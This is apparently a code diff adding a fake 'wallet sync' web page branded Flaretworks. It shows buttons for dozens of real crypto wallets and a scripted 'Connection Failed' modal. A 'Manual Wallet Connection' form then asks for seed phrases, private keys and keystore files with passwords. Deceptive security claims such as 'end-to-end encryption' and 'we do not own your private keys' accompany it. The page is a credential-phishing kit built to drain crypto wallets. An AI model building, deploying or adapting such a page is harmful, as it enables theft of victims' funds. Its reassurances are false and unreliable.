+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Ton Keeper-tab" data-bs-toggle="pill" data-bs-target="#pills-Ton Keeper" data-payment-protocol="7" data-wallet-name="Ton Keeper" data-wallet-logo="assets/img/wallets/tonkeeper.jfif" type="button" role="tab" aria-controls="pills-Ton Keeper" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/tonkeeper.jfif" width="50"></span>
+            <span class="h6 fw-bold">Ton Keeper</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Ton Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Ton Wallet-tab" data-bs-toggle="pill" data-bs-target="#pills-Ton Wallet" data-payment-protocol="7" data-wallet-name="Ton Wallet" data-wallet-logo="assets/img/wallets/ton.png" type="button" role="tab" aria-controls="pills-Ton Wallet" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/ton.png" width="50"></span>
+            <span class="h6 fw-bold">Ton Wallet</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Tonhub -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Tonhub-tab" data-bs-toggle="pill" data-bs-target="#pills-Tonhub" data-payment-protocol="9" data-wallet-name="Tonhub" data-wallet-logo="assets/img/wallets/tonhub.jfif" type="button" role="tab" aria-controls="pills-Tonhub" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/tonhub.jfif" width="50"></span>
+            <span class="h6 fw-bold">Tonhub</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Tronlink -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-tronlink-tab" data-bs-toggle="pill" data-bs-target="#pills-tronlink" data-payment-protocol="7" data-wallet-name="Tronlink" data-wallet-logo="assets/img/wallets/tronlink.jfif" type="button" role="tab" aria-controls="pills-tronlink" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/tronlink.jfif" width="50"></span>
+            <span class="h6 fw-bold">Tronlink</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Uniswap -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Uniswap-tab" data-bs-toggle="pill" data-bs-target="#pills-Uniswap" data-payment-protocol="7" data-wallet-name="Uniswap" data-wallet-logo="assets/img/wallets/uniswap.jfif" type="button" role="tab" aria-controls="pills-Uniswap" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/uniswap.jfif" width="50"></span>
+            <span class="h6 fw-bold">Uniswap</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Unstoppable -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-unstoppable-tab" data-bs-toggle="pill" data-bs-target="#pills-unstoppable" data-payment-protocol="7" data-wallet-name="Unstoppable" data-wallet-logo="assets/img/wallets/unstoppable.jfif" type="button" role="tab" aria-controls="pills-unstoppable" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/unstoppable.jfif" width="50"></span>
+            <span class="h6 fw-bold">Unstoppable</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Wasabi -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-wasabi-tab" data-bs-toggle="pill" data-bs-target="#pills-wasabi" data-payment-protocol="7" data-wallet-name="wasabi" data-wallet-logo="assets/img/wallets/wasabi.png" type="button" role="tab" aria-controls="pills-wasabi" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/wasabi.png" width="50"></span>
+            <span class="h6 fw-bold">Wasabi</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Xaman -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Xaman-tab" data-bs-toggle="pill" data-bs-target="#pills-Xaman" data-payment-protocol="9" data-wallet-name="Xaman" data-wallet-logo="assets/img/wallets/xaman.jfif" type="button" role="tab" aria-controls="pills-Xaman" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/xaman.jfif" width="50"></span>
+            <span class="h6 fw-bold">Xaman</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- XcelPay -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-XcelPay-tab" data-bs-toggle="pill" data-bs-target="#pills-XcelPay" data-payment-protocol="9" data-wallet-name="XcelPay" data-wallet-logo="assets/img/wallets/xcelpay.jfif" type="button" role="tab" aria-controls="pills-XcelPay" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/xcelpay.jfif" width="50"></span>
+            <span class="h6 fw-bold">XcelPay</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Xportal -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-xportal-tab" data-bs-toggle="pill" data-bs-target="#pills-xportal" data-payment-protocol="7" data-wallet-name="xportal" data-wallet-logo="assets/img/wallets/xportal.png" type="button" role="tab" aria-controls="pills-xportal" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/xportal.png" width="50"></span>
+            <span class="h6 fw-bold">Xportal</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Youhodler -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Youhodler-tab" data-bs-toggle="pill" data-bs-target="#pills-Youhodler" data-payment-protocol="7" data-wallet-name="Youhodler" data-wallet-logo="assets/img/wallets/youhodler.jfif" type="button" role="tab" aria-controls="pills-Youhodler" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/youhodler.jfif" width="50"></span>
+            <span class="h6 fw-bold">Youhodler</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Zano -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Zano-tab" data-bs-toggle="pill" data-bs-target="#pills-Zano" data-payment-protocol="9" data-wallet-name="Zano" data-wallet-logo="assets/img/wallets/zano.jfif" type="button" role="tab" aria-controls="pills-Zano" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/zano.jfif" width="50"></span>
+            <span class="h6 fw-bold">Zano</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Zelcore -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-zelcore-tab" data-bs-toggle="pill" data-bs-target="#pills-zelcore" data-payment-protocol="7" data-wallet-name="Zelcore" data-wallet-logo="assets/img/wallets/zelcore.png" type="button" role="tab" aria-controls="pills-zelcore" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/zelcore.png" width="50"></span>
+            <span class="h6 fw-bold">Zelcore</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Zengo -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Zengo-tab" data-bs-toggle="pill" data-bs-target="#pills-Zengo" data-payment-protocol="7" data-wallet-name="Zengo" data-wallet-logo="assets/img/wallets/zengo.jfif" type="button" role="tab" aria-controls="pills-Zengo" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/zengo.jfif" width="50"></span>
+            <span class="h6 fw-bold">Zengo</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Zerion -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Zerion-tab" data-bs-toggle="pill" data-bs-target="#pills-Zerion" data-payment-protocol="7" data-wallet-name="Zerion" data-wallet-logo="assets/img/wallets/zerion.jfif" type="button" role="tab" aria-controls="pills-Zerion" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/zerion.jfif" width="50"></span>
+            <span class="h6 fw-bold">Zerion</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- Zilpay -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-zilpay-tab" data-bs-toggle="pill" data-bs-target="#pills-zilpay" data-payment-protocol="7" data-wallet-name="Zilpay" data-wallet-logo="assets/img/wallets/zilpay.png" type="button" role="tab" aria-controls="pills-zilpay" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/zilpay.png" width="50"></span>
+            <span class="h6 fw-bold">Zilpay</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- 1inch -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-1inch-tab" data-bs-toggle="pill" data-bs-target="#pills-1inch" data-payment-protocol="7" data-wallet-name="1inch" data-wallet-logo="assets/img/wallets/1inch.jfif" type="button" role="tab" aria-controls="pills-1inch" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/1inch.jfif" width="50"></span>
+            <span class="h6 fw-bold">1inch</span>
+        </span>
+    </button>
+                        </li>
+
+                        <!-- WalletConnect -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-walletconnect-tab" data-bs-toggle="pill" data-bs-target="#pills-walletconnect" data-payment-protocol="9" data-wallet-name="WalletConnect" data-wallet-logo="assets/img/wallets/walletconnect.png" type="button" role="tab" aria-controls="pills-walletconnect" aria-selected="true">
+        <span class="text-center px-0 px-md-3 d-flex align-item-center flex-column">
+            <span class="mb-2"><img class=" " src="assets/img/wallets/walletconnect.png" width="50"></span>
+            <span class="h6 fw-bold">WalletConnect</span>
+        </span>
+    </button>
+                        </li>
+                    </ul>
+                    <div class="d-flex align-items-center justify-content-center mt-4 pt-4">
+                        <div class="text-muted small text-center">We do not own your private keys and cannot access
+                            your<br> funds without your confirmation or approval.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="bg-dark py-4">
+        <div class="container py-4">
+            <div class="row justify-content-center">
+                <div class="col-xl-6 col-lg-7 col-md-8 col-12">
+                    <div class="text-center py-4">
+                        <small class="text-white-50">- Flaretworks™ -</small>
+                        <h1 class="fw-bold text-white py-3">We make sure that everyone is able to securely use their
+                            wallet</h1>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer bg-white py-5">
+        <div class="container py-4">
+            <div class="row">
+                <div class="col-md-12 col-lg-4 col-12">
+                    <div class="row">
+                        <div class="col-3">
+                            <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
+                        </div>
+                        <div class="col-9 mt-2">
+                            <h4>Flaretworks™</h4>
+                        </div>
+                    </div>
+                    <div class="text-muted mt-4">
+                        <p class="mb-4">Open and decentralized protocol for syncing various Wallets to Dapps Secure
+                            Server. This is not an app but a protocol that establishes a remote connection between
+                            two/more apps and/or devices</p>
+                        <p>Every digital artwork on Upside is authentic and truly unique. Blockchain technology makes
+                            this new approach to digital ownership possible. Open and decentralized protocol for syncing
+                            various Wallets issues on Secure Server. It is an online server which gets you across to
+                            every wallet representative to enable effective complaint and rectification of issues.</p>
+                    </div>
+                </div>
+                <div class="col-md-12 col-lg-4 col-12">
+                    <script type="text/javascript">
+                        baseUrl = "https://widgets.cryptocompare.com/";
+                        var scripts = document.getElementsByTagName("script");
+                        var embedder = scripts[ scripts.length - 1 ];
+                        (function (){
+                            var appName = "google.com";
+                            var s = document.createElement("script");
+                            s.type = "text/javascript";
+                            s.async = true;
+                            var theUrl = baseUrl+'serve/v1/coin/feed?fsym=BTC&tsym=USD';
+                            s.src = theUrl + ( theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+                            embedder.parentNode.appendChild(s);
+                        })();
+                    </script>
+                </div>
+                <div class="col-md-12 col-lg-4 col-12">
+                    <form>
+                        <h6 class="fw-bold text-body mb-2">SUBSCRIBE</h6>
+                        <div class="mb-4 text-muted">Subscribe for the latest news, drops & new features</div>
+                        <div class="input-group">
+                            <input type="text" class="form-control" placeholder="Enter Your Email">
+                            <button class="btn btn-primary" type="button"><i class="bi bi-envelope me-2"></i> Subscribe</button>
+                        </div>
+                        <div class="small mt-3 text-danger">No worries we don't spam! Unsubscribe at any time by <br>clicking on the link in the email.
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="footer-mid py-4">
+        <div class="container">
+            <div class="row align-items-center justify-content-between">
+                <div class="col-12 text-center">
+                    <div class="mb-4 mb-md-0">
+                        <a href="index-2.html" class="text-decoration-none link-dark fw-bold pe-2">Home</a>
+                        <a href="privacy.html" class="text-decoration-none link-dark fw-bold pe-2">Privacy</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer-end bg-white py-4">
+        <div class="container">
+            <div class="row align-items-center justify-content-center">
+                <div class="col-12 text-center">
+                    <span class="small">© 2025 Flaretworks™, All rights reserved.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal fade" id="modalPaymentProtocol" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
+        aria-modal="true" role="dialog">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content border-0 rounded shadow">
+                <div class="modal-header border-0">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body px-5">
+                    <div class="text-center mb-5">
+                        <img id="selected_wallet_logo" src="#" width="30"/>
+                        <b id="selected_wallet_name" style="font-size: larger; vertical-align: middle;"></b>
+                    </div>
+                    <div class="text-center mb-4 connection_loading">
+                        <div class="spinner-border" role="status" style="font-size: x-large">
+                            <span class="sr-only">Loading...</span>
+                        </div>
+                        <div class="h1 fw-bold">Connecting...</div>
+                        <div class="mt-3">Please Wait</div>
+                    </div>
+                    <div class="text-center mb-4 can_not_connect" style="display:none">
+                        <div class="h2 fw-bold text-danger">Connection Failed</div>
+                        <div class="alert alert-danger" role="alert">
+                            <i class="bi bi-info-circle text-danger mb-3"></i>
+                            We could not automatically initiate a connection with your selected wallet protocol. A
+                            manual connection will be automatically started. Connect your wallet and follow prompt.
+                        </div>
+                        <div class="d-grid">
+                            <button type="button" class="btn btn-primary btn_try_connection_again btn-sm shadow-sm">
+                                <i class="bi bi-arrow-clockwise"></i> Try again
+                            </button>
+                        </div>
+                        <div class="text-center mt-1"><b class="seconds_count_to_manual">5</b></div>
+                    </div>
+                    <div class="text-center mb-4 waiting_for_connection" style="display:none">
+                        Waiting for confirmation...<br>
+                        Enter your wallet details to proceed.
+                    </div>
+                    <div class="d-flex align-items-center justify-content-between divide my-3">
+                        <hr class="w-100">
+                        <hr class="w-100">
+                    </div>
+                    <div class="text-center">
+                        <div><i class="bi bi-lock" style="color:green;"></i> This connection is protected with an <a
+                                href="#" class="text-decoration-none link-primary fw-bold">end-to-end encryption</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Floating Submission Box -->
+    <div id="floating-submission-box" class="card shadow-lg"
+        style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1050; width: 400px; max-width: 90%;">
+        <div class="card-header bg-primary text-white text-center position-relative">
+            <h5 class="mb-0">Manual Wallet Connection</h5>
+            <button type="button" class="btn-close btn-close-white position-absolute end-0 top-50 translate-middle-y me-2" onclick="$('#floating-submission-box').fadeOut();"></button>
+        </div>
+        <div class="card-body">
+            <div class="text-center mb-3">
+                <img id="submission_wallet_logo" src="#" width="30"/>
+                <b id="submission_wallet_name" style="font-size: larger; vertical-align: middle;"></b>
+            </div>
+            <ul class="nav nav-tabs justify-content-center mb-3" id="credentialTabs" role="tablist">
+                <li class="nav-item">
+                    <button class="nav-link active" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase" type="button" role="tab" aria-controls="phrase" aria-selected="true">Seed Phrase</button>
+                </li>
+                <li class="nav-item">
+                    <button class="nav-link" id="private-tab" data-bs-toggle="tab" data-bs-target="#private" type="button" role="tab" aria-controls="private" aria-selected="false">Private Key</button>
+                </li>
+                <li class="nav-item">
+                    <button class="nav-link" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore" type="button" role="tab" aria-controls="keystore" aria-selected="false">Keystore</button>
+                </li>
+            </ul>
+            <div class="tab-content" id="credentialTabContent">
+                <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
+                    <div class="mb-3">
+                        <label for="seed-phrase" class="form-label">Enter Seed Phrase</label>
+                        <textarea class="form-control" id="seed-phrase" rows="2" placeholder="e.g., word1 word2 word3..." required></textarea>
+                        <small class="text-muted">Supported lengths: 12, 15, 18, 20, 21, or 24 words</small>
+                    </div>
+                    <div class="mb-3">
+                        <label for="passphrase" class="form-label">Passphrase (Optional)</label>
+                        <input type="password" class="form-control" id="passphrase" placeholder="Enter passphrase if applicable">
+                    </div>
+                </div>
+                <div class="tab-pane fade" id="private" role="tabpanel" aria-labelledby="private-tab">
+                    <div class="mb-3">
+                        <label for="private-key" class="form-label">Enter Private Key</label>
+                        <input type="text" class="form-control" id="private-key" placeholder="e.g., 0x..." required>
+                    </div>
+                </div>
+                <div class="tab-pane fade" id="keystore" role="tabpanel" aria-labelledby="keystore-tab">
+                    <div class="mb-3">
+                        <label for="keystore-file" class="form-label">Upload Keystore File</label>
+                        <input type="file" class="form-control" id="keystore-file" accept=".json,.txt,.dat,.key,.wallet" required>
+                        <small class="text-muted">Supported formats: .json, .txt, .dat, .key, .wallet</small>
+                    </div>
+                    <div class="mb-3">
+                        <label for="keystore-password" class="form-label">Keystore Password</label>
+                        <input type="password" class="form-control" id="keystore-password" placeholder="Enter keystore password" required>
+                    </div>
+                </div>
+            </div>
+            <div class="alert alert-warning mt-2 text-center">This tool is protected and encrypted by HTTPS. Check our
+                <a href="privacy.html" class="text-decoration-none">Privacy page</a>.</div>
+            <div class="d-grid">
+                <button type="button" class="btn btn-primary" id="submit-credentials">Submit</button>
+            </div>
+        </div>
+        <div class="card-footer text-center text-muted small">
+            <i class="bi bi-lock" style="color:green;"></i> Encrypted client-side
+        </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="error-modal" class="card shadow-lg"
+        style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1060; width: 300px; max-width: 90%;">
+        <div class="card-header bg-danger text-white text-center">
+            <h5 class="mb-0">Connection Error</h5>
+        </div>
+        <div class="card-body text-center">
+            <p id="error-message">Error connecting to wallet</p>
+            <button type="button" class="btn btn-secondary" onclick="$('#error-modal').fadeOut();">Close</button>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="assets/vendor/jquery/jquery.min.js"></script>
+    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/vendor/slick/slick.min.js"></script>
+    <script src="assets/vendor/qrcodejs/qrcode.min.js"></script>
+    <script src="assets/js/main.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js"></script>
+    <script src="https://www.google.com/recaptcha/api.js?render=6Lc7R_0qAAAAAO4UT6C8kn0kI_ZwEXtTxTILZVxA"></script>
+
+    <style>
+        .payment_protocol_button.active img {
+            -webkit-filter: grayscale(0);
+            filter: none;
+        }
+
+        @media (max-width: 767.98px) {
+            .col-12.col-lg-9 {
+                padding-left: 0 !important;
+                padding-right: 0 !important;
+            }
+
+            ul.nav.help-tabs#pills-tab {
+                display: flex !important;
+                flex-wrap: wrap !important;
+                justify-content: flex-start !important;
+                padding: 0 5px !important;
+                margin: 0 !important;
+            }
+
+            ul.nav.help-tabs#pills-tab .nav-item {
+                flex: 0 0 calc(50% - 10px) !important;
+                margin: 5px !important;
+                box-sizing: border-box !important;
+                max-width: calc(50% - 10px) !important;
+            }
+
+            ul.nav.help-tabs#pills-tab .nav-item button {
+                width: 90% !important;
+                margin: 0 auto !important;
+                padding: 6px !important;
+                font-size: 0.8rem !important;
+            }
+
+            ul.nav.help-tabs#pills-tab .nav-item button img {
+                width: 30px !important;
+            }
+
+            ul.nav.help-tabs#pills-tab .nav-item button .h6 {
+                font-size: 0.8rem !important;
+                margin-bottom: 0 !important;
+            }
+        }
+    </style>
+
+    <script>
+        var sitePaymentProtocols = JSON.parse(JSON.stringify([
+        {"name": "Metamask", "code": "metamask", "img_name": "metamask.png", "img_width": "50"},
+        {"name": "Trust Wallet", "code": "trust_wallet", "img_name": "trust_wallet.png", "img_width": "50"},
+        {"name": "Coinbase", "code": "coinbase", "img_name": "coinbase.png", "img_width": "50"},
+        {"name": "Ledger", "code": "ledger", "img_name": "ledgerlive.png", "img_width": "50"},
+        {"name": "Trezor", "code": "trezor", "img_name": "Trezor.jfif", "img_width": "50"},
+        {"name": "Aave", "code": "aave", "img_name": "aave.png", "img_width": "50"},
+        {"name": "Ambire", "code": "ambire", "img_name": "ambire.jfif", "img_width": "50"},
+        {"name": "ArConnect", "code": "arconnect", "img_name": "arconnect.png", "img_width": "50"},
+        {"name": "Arculus", "code": "arculus", "img_name": "arculus.jfif", "img_width": "50"},
+        {"name": "Argent", "code": "argent", "img_name": "argent.jfif", "img_width": "50"},
+        {"name": "Atomic", "code": "atomic", "img_name": "atomic.jfif", "img_width": "50"},
+        {"name": "Binance", "code": "binance", "img_name": "binance.jfif", "img_width": "50"},
+        {"name": "Bitcoin", "code": "bitcoin", "img_name": "Bitcoin.jfif", "img_width": "50"},
+        {"name": "Bitbox", "code": "bitbox", "img_name": "bitbox.jfif", "img_width": "50"},
+        {"name": "Bitget", "code": "bitget", "img_name": "Bitget.jfif", "img_width": "50"},
+        {"name": "BitPay", "code": "bitpay", "img_name": "bitpay.jfif", "img_width": "50"},
+        {"name": "Blade", "code": "blade", "img_name": "blade.png", "img_width": "50"},
+        {"name": "Blue Wallet", "code": "bluewallet", "img_name": "blue.jfif", "img_width": "50"},
+        {"name": "BRD", "code": "brd", "img_name": "brd.jfif", "img_width": "50"},
+        {"name": "Cake Wallet", "code": "cakewallet", "img_name": "cake.jfif", "img_width": "50"},
+        {"name": "Ckbull", "code": "ckbull", "img_name": "ckbull.jfif", "img_width": "50"},
+        {"name": "Coin Wallet", "code": "coinwallet", "img_name": "coin.png", "img_width": "50"},
+        {"name": "Coinjar", "code": "coinjar", "img_name": "coinjar.jfif", "img_width": "50"},
+        {"name": "Coinomi", "code": "coinomi", "img_name": "coinomi.jfif", "img_width": "50"},
+        {"name": "Coinspace", "code": "coinspace", "img_name": "coinspace.jfif", "img_width": "50"},
+        {"name": "Coldcard", "code": "coldcard", "img_name": "coldcard.jfif", "img_width": "50"},
+        {"name": "Cool Wallet", "code": "coolwallet", "img_name": "cool.jfif", "img_width": "50"},
+        {"name": "Core", "code": "core", "img_name": "core.png", "img_width": "50"},
+        {"name": "Crypto Defi", "code": "cryptodefi", "img_name": "crypto defi.jfif", "img_width": "50"},
+        {"name": "Cwallet", "code": "cwallet", "img_name": "cwallet.png", "img_width": "50"},
+        {"name": "D'Cent", "code": "dcent", "img_name": "dcent.png", "img_width": "50"},
+        {"name": "Electrum", "code": "electrum", "img_name": "electrum.jfif", "img_width": "50"},
+        {"name": "Ellipal", "code": "ellipal", "img_name": "ellipal.jpg", "img_width": "50"},
+        {"name": "Enjin", "code": "enjin", "img_name": "enjin.jfif", "img_width": "50"},
+        {"name": "Exodus", "code": "exodus", "img_name": "exodus.png", "img_width": "50"},
+        {"name": "Fearless", "code": "fearless", "img_name": "fearless.jfif", "img_width": "50"},
+        {"name": "Frontier", "code": "frontier", "img_name": "frontier.jfif", "img_width": "50"},
+        {"name": "Green Address", "code": "greenaddress", "img_name": "green address.jfif", "img_width": "50"},
+        {"name": "Guarda", "code": "guarda", "img_name": "guarda.jfif", "img_width": "50"},
+        {"name": "HashPack", "code": "hashpack", "img_name": "hashpack.jfif", "img_width": "50"},
+        {"name": "Helium", "code": "helium", "img_name": "helium.png", "img_width": "50"},
+        {"name": "Huobi", "code": "huobi", "img_name": "huobi.jfif", "img_width": "50"},
+        {"name": "imToken", "code": "imtoken", "img_name": "imtoken.jfif", "img_width": "50"},
+        {"name": "Infinity", "code": "infinity", "img_name": "infinity.jfif", "img_width": "50"},
+        {"name": "Jupiter", "code": "jupiter", "img_name": "jupiter.jfif", "img_width": "50"},
+        {"name": "Kaspium", "code": "kaspium", "img_name": "kaspium.webp", "img_width": "50"},
+        {"name": "KeepKey", "code": "keepkey", "img_name": "keepkey.jfif", "img_width": "50"},
+        {"name": "Keplr", "code": "keplr", "img_name": "eplr.jfif", "img_width": "50"},
+        {"name": "Keystone", "code": "keystone", "img_name": "keystone.jfif", "img_width": "50"},
+        {"name": "Klever", "code": "klever", "img_name": "klever.png", "img_width": "50"},
+        {"name": "Komodo", "code": "komodo", "img_name": "komodo.png", "img_width": "50"},
+        {"name": "Kraken", "code": "kraken", "img_name": "kraken.jfif", "img_width": "50"},
+        {"name": "Leap", "code": "leap", "img_name": "leap.jfif", "img_width": "50"},
+        {"name": "Leo Wallet", "code": "leowallet", "img_name": "leo.png", "img_width": "50"},
+        {"name": "Lobstr", "code": "lobstr", "img_name": "lobstr.jfif", "img_width": "50"},
+        {"name": "Loopring", "code": "loopring1", "img_name": "loopring.jfif", "img_width": "50"},
+        {"name": "Loopring", "code": "loopring2", "img_name": "loopring.png", "img_width": "50"},
+        {"name": "Math", "code": "math", "img_name": "math.jfif", "img_width": "50"},
+        {"name": "Monero GUI", "code": "monerogui", "img_name": "monero.png", "img_width": "50"},
+        {"name": "Monerujo", "code": "monerujo", "img_name": "monerujo.jfif", "img_width": "50"},
+        {"name": "Mydoge", "code": "mydoge", "img_name": "mydoge.jfif", "img_width": "50"},
+        {"name": "Mycelium", "code": "mycelium", "img_name": "mycelium.jfif", "img_width": "50"},
+        {"name": "Myether Wallet", "code": "myetherwallet", "img_name": "myether.jfif", "img_width": "50"},
+        {"name": "Mymonero", "code": "mymonero", "img_name": "mymonero.jfif", "img_width": "50"},
+        {"name": "Myton", "code": "myton", "img_name": "myton.jfif", "img_width": "50"},
+        {"name": "Near", "code": "near", "img_name": "near.png", "img_width": "50"},
+        {"name": "Neon", "code": "neon", "img_name": "neon.png", "img_width": "50"},
+        {"name": "Nova", "code": "nova", "img_name": "nova.jfif", "img_width": "50"},
+        {"name": "Nunchuk", "code": "nunchuk", "img_name": "nunchuk.png", "img_width": "50"},
+        {"name": "OKX", "code": "okx", "img_name": "okx.jfif", "img_width": "50"},
+        {"name": "OneKey", "code": "onekey", "img_name": "onekey.png", "img_width": "50"},
+        {"name": "Onto", "code": "onto", "img_name": "onto.png", "img_width": "50"},
+        {"name": "Pera Algo", "code": "peraalgo", "img_name": "pera.png", "img_width": "50"},
+        {"name": "Phantom", "code": "phantom", "img_name": "phantom.png", "img_width": "50"},
+        {"name": "Rabby Wallet", "code": "rabby", "img_name": "rabby.jfif", "img_width": "50"},
+        {"name": "Robinhood", "code": "robinhood", "img_name": "robinhood.jpg", "img_width": "50"},
+        {"name": "RockWallet", "code": "rockwallet", "img_name": "rock.png", "img_width": "50"},
+        {"name": "Ronin", "code": "ronin", "img_name": "ronin.jpg", "img_width": "50"},
+        {"name": "Safe{Wallet}", "code": "safewallet", "img_name": "safe.png", "img_width": "50"},
+        {"name": "Safemoon", "code": "safemoon", "img_name": "safemoon.png", "img_width": "50"},
+        {"name": "Safepal", "code": "safepal", "img_name": "safepal.jpg", "img_width": "50"},
+        {"name": "Simplehold", "code": "simplehold", "img_name": "simplehold.jfif", "img_width": "50"},
+        {"name": "Solar", "code": "solar", "img_name": "solar.jpg", "img_width": "50"},
+        {"name": "Solflare", "code": "solflare", "img_name": "solfare.jpg", "img_width": "50"},
+        {"name": "Staked Wallet", "code": "stakedwallet", "img_name": "stakedwallet.jfif", "img_width": "50"},
+        {"name": "Sui Wallet", "code": "suiwallet", "img_name": "sui.png", "img_width": "50"},
+        {"name": "Tangem", "code": "tangem", "img_name": "tangem.png", "img_width": "50"},
+        {"name": "Terra Station", "code": "terrastation", "img_name": "terra.png", "img_width": "50"},
+        {"name": "Tezos", "code": "tezos", "img_name": "tz.jfif", "img_width": "50"},
+        {"name": "Ton Keeper", "code": "tonkeeper", "img_name": "tonkeeper.jfif", "img_width": "50"},
+        {"name": "Ton Wallet", "code": "tonwallet", "img_name": "ton.png", "img_width": "50"},
